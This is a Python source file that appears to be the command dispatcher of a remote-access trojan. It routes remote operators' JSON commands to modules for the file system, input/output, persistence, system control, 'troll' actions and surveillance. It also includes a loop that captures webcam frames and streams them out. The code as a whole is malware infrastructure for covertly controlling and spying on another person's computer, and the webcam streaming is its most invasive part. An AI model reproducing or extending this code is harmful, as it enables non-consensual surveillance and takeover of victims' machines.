import time
from .file_system import network_handler as file_system
from .input_output import network_handler as input_output
from .persistence import network_handler as persistence
from .system import network_handler as system
from .troll import network_handler as troll
from .surveillance import network_handler as surveillance
import json
from dependencies.modules.surveillance.image_grab import img_grab_obj

#errors
INVALID_ARGUMENTS = "INVALID_ARGUMENTS"
MODULE_DOESNT_EXIST = "MODULE_DOESNT_EXIST"


def handle_command(command_dict, get_result):
    command = command_dict["command"]
    args = command_dict["args"]
    user = command_dict["user"]
    if args == ['']:
        args = []
    try:
        result = get_result(command,args)
    except TypeError:
        result = INVALID_ARGUMENTS
    response = {"user" : user, "command" : command, "result" : result}
    return json.dumps(response)

def handle_module(command, client):
    command = json.loads(command)
    module = command["module"]
    if module == "file_system":
        return handle_command(command, file_system.get_result)
    elif module == "input_output":
        return handle_command(command, input_output.get_result)
    elif module == "persistence":
        return handle_command(command, persistence.get_result)
    elif module == "system":
        return handle_command(command, system.get_result)
    elif module == "troll":
        return handle_command(command, troll.get_result)
    elif module == "surveillance":
        if command["command"] != "stop_camera":
            return handle_command(command, surveillance.get_result)
        for p in client.running_continous_commands:
            print(p[1])
            if p[1]['command'] == "start_camera":
                p[0].terminate()
                print("here")
                return json.dumps({"user" : command["user"], "command" : command["command"], "result" : "Success"})
    else: 
        return MODULE_DOESNT_EXIST
    
def handle_continous_func(queue, command):
    command_dict = json.loads(command)
    command = command_dict["command"]
    user = command_dict["user"]
    args = command_dict["args"]
    if args == ['']:
        args = []
    if command == "start_camera":
        img_grab_obj.set_index(*args)
        img_grab_obj.start()
        i = 0
        while img_grab_obj.stopped == False:
            i += 1
            image, size = img_grab_obj.capture_image()
            response = {"user" : user, "command" : command, "frame_no" : i, "result" : image, "size" : size}
            queue.put(json.dumps(response))
            time.sleep(0.1)
    else: 
        return "ERROR"

